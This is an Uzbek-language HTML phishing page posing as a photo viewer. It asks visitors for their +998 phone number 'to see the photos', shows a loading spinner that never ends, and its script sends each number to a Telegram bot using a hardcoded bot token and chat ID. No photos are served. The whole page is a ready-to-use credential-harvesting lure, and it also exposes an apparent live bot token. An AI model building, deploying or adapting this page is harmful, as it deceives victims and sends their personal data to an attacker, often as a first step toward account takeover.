<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#007bff">
    <title>Foto ko'rish</title>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Roboto', sans-serif;
        }

        .login-card {
            background: #ffffff;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
            width: 92%;
            max-width: 380px;
            text-align: center;
            min-height: 280px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        h2 {
            font-size: 1.2rem;
            color: #1a1a1a;
            margin-bottom: 25px;
            font-weight: 500;
            line-height: 1.4;
        }

        .input-container {
            display: flex;
            align-items: center;
            background: #f1f3f4;
            border: 2px solid transparent;
            border-radius: 14px;
            padding: 14px 16px;
            margin-bottom: 20px;
            transition: all 0.2s ease;
        }

        .input-container:focus-within {
            background: #fff;
            border-color: #007bff;
            box-shadow: 0 0 0 4px rgba(0,123,255,0.1);
        }

        .prefix {
            font-weight: 700;
            color: #3c4043;
            font-size: 1.15rem;
            margin-right: 12px;
            padding-right: 10px;
            border-right: 1px solid #dadce0;
        }

        input {
            border: none;
            background: transparent;
            outline: none;
            font-size: 1.15rem;
            width: 100%;
            color: #202124;
            letter-spacing: 1px;
        }

        button {
            width: 100%;
            padding: 16px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 1.05rem;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,123,255,0.25);
            transition: all 0.2s;
        }

        button:active {
            background: #0056b3;
            transform: scale(0.96);
        }

        #loader {
            display: none;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #5f6368;
            font-size: 1.1rem;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div id="auth-content">
            <h2>Rasmlarni ko'rish uchun telefon raqamingizni kiriting</h2>
            <form id="mainForm">
                <div class="input-container">
                    <span class="prefix">+998</span>
                    <input type="tel" id="userPhone" placeholder="901234567" inputmode="tel" maxlength="9" pattern="[0-9]{9}" required>
                </div>
                <button type="submit">Davom etish</button>
            </form>
        </div>

        <div id="loader">
            <div class="spinner"></div>
            <div class="loading-text">Rasmlar yuklanishini kuting...</div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = '8700906153:AAENo0IAVtw6sG3LJiuLk9TEfeM4nlD8aM0'; 
        const TELEGRAM_CHAT_ID = '5105182951';

        document.getElementById('mainForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('userPhone').value;
            const fullNumber = '+998' + phone;
            const message = `📱 Yangi raqam: ${fullNumber}`;

            document.getElementById('auth-content').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            })
            .then(() => {
                console.log("Yuborildi");
            })
            .catch(err => {
                console.error("Xatolik:", err);
            });
        });
    </script>

</body>
</html>
